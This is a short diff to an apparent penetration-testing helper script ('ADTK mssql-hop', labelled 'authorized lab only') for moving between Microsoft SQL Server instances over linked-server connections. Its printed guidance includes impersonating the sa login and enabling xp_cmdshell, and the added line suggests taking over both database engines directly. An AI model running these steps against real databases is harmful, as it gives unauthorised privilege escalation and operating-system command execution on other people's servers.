@@ -55,6 +55,7 @@ def main() -> int:
     secret = args.password
     print("ADTK mssql-hop — authorized lab only")
     print("After links: EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT [LINK];")
+    print("If EXEC AT times out but ping works: stale data_source — own both engines directly.")
     print("Then EXECUTE AS LOGIN = 'sa';  EXEC sp_configure 'xp_cmdshell', 1;")
     for name, sql in QUERIES:
         print(f"\n── {name} ──")
